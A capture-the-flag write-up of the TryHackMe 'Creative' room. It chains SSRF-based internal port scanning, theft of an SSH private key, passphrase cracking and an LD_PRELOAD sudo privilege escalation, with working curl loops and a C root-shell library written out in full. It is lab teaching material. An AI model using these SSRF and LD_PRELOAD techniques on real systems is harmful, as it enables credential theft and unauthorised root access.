# Creative — TryHackMe Writeup

**Difficulty:** Easy  
**OS:** Linux  
**Techniques:** SSRF · Internal Port Forwarding · SSH Key Extraction · LD_PRELOAD Privesc

---

## 1. Reconnaissance

### Port Scanning

```bash
nmap -sVC -p- --min-rate 5000 $TARGET -oN service.txt
```

**Relevant Output:**
```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http  nginx 1.18.0 (Ubuntu)
          → Redirects to http://creative.thm (Virtual Hosting)
```

The server uses **virtual hosting**, so we add the domain to `/etc/hosts`:

```bash
echo "$TARGET creative.thm" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### Directory Fuzzing

```bash
feroxbuster -u http://creative.thm \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  --status-codes 200,301
```

### Virtual Host Fuzzing

We look for unknown subdomains:

```bash
gobuster vhost -u http://creative.thm \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

**Found:** `beta.creative.thm` → Status 200

```bash
echo "$TARGET beta.creative.thm" | sudo tee -a /etc/hosts
```

### Subdomain Analysis

```bash
curl http://beta.creative.thm/
```

The page exposes a **URL Tester**: a form that takes a URL, makes the request from the server, and returns the content.
This is a clear **SSRF (Server-Side Request Forgery)** vector.

---

## 3. Exploitation — SSRF

### SSRF Confirmation

```bash
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1"
```

The server returns the `creative.thm` website — confirming it is making internal requests to itself.

### Internal Port Discovery

We automate scanning all ports via SSRF:

```bash
seq 1 65535 | xargs -P 100 -I{} bash -c '
  result=$(curl -s -m 1 -X POST "http://beta.creative.thm" \
    -d "url=http://127.0.0.1:{}" \
    -H "Content-Type: application/x-www-form-urlencoded")
  if ! echo "$result" | grep -qE "Dead|^$"; then
    echo "[OPEN] Port {}"
    echo "$result" | head -c 300
  fi
' 2>/dev/null
```

**Result:**
```
[OPEN] Port 1337
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"...>
→ Filesystem directory listing
```

Port **1337** exposes an internal **HTTP server with directory listing**, not accessible from the outside — only reachable via SSRF.

### SSH Private Key Extraction

We browse the filesystem through the SSRF:

```bash
# View the home directory
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home"

# List saad's home
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home/saad/.ssh/"

# Download the SSH private key
curl -s -X POST "http://beta.creative.thm" \
  -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" > saad_key

chmod 600 saad_key
```

---

## 4. Initial Access — SSH

```bash
ssh saad@$TARGET -i saad_key
```

The key has a **passphrase**. We crack it with john:

```bash
ssh2john saad_key > saad_key.hash
john saad_key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Passphrase found:** `sweetness`

```bash
ssh saad@$TARGET -i saad_key
# Enter passphrase: sweetness
```

**User flag:**
```bash
cat ~/user.txt
```

---

## 5. Privilege Escalation

### Post-Exploitation Enumeration

```bash
cat ~/.bash_history
```

The history reveals plaintext credentials:

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt   ← tried to delete them but history saved it
```

### Sudo Analysis

```bash
sudo -l
# Password: MyStrongestPasswordYet$4291
```

**Critical Result:**
```
env_reset, env_keep+=LD_PRELOAD
(root) NOPASSWD: /usr/bin/ping
```

Two dangerous configurations in `/etc/sudoers`:

| Configuration | Problem |
|---|---|
| `env_keep+=LD_PRELOAD` | sudo DOES NOT strip this variable from the environment |
| `(root) /usr/bin/ping` | Saad can run ping as root |

### LD_PRELOAD Privilege Escalation

**Why does it work**

`LD_PRELOAD` allows loading a `.so` library before any other when executing a program. Normally, sudo strips it, but here it is explicitly kept (`env_keep`). When running ping as root, our library is loaded with root privileges before ping starts, granting us a shell.

```
saad (normal user)
     │
     └─► sudo LD_PRELOAD=shell.so /usr/bin/ping
               │
               ▼
          Linux loads shell.so  ← our code
               │
               ▼
          _init() → setuid(0) → setgid(0)
               │
               ▼
          /bin/bash -p  →  ROOT 🎯
```

**Exploit:**

```bash
# 1. Create the malicious C library
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD"); // Clean up to avoid loops in child processes
    setuid(0);              // Escalate UID to root
    setgid(0);              // Escalate GID to root
    system("/bin/bash -p"); // Launch bash preserving privileges (-p)
}
EOF

# 2. Compile as shared library (.so)
# -fPIC       → Position Independent Code (mandatory for .so)
# -shared     → generates library, not executable
# -nostartfiles → without standard main()
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c

# 3. Run ping with our preloaded library
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

**Verification:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

---

## 6. Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | SSRF | beta.creative.thm | Access to internal services |
| 2 | Directory listing | Internal port 1337 | Arbitrary file read |
| 3 | Credentials in bash_history | ~/.bash_history | Saad's plaintext password |
| 4 | sudo env_keep+=LD_PRELOAD | /etc/sudoers | Full escalation to root (CWE-426) |

---

## 7. References

- [GTFOBins — LD_PRELOAD](https://gtfobins.github.io)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz)
- [CWE-426 — Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [john](../../../tools/creds/john.md)
- [ssrf-internal-port-scan](../../../exploits/web-disclosure/ssrf-internal-port-scan.md)
- [sudo-ld-preload](../../../privesc/linux/sudo-ld-preload.md)
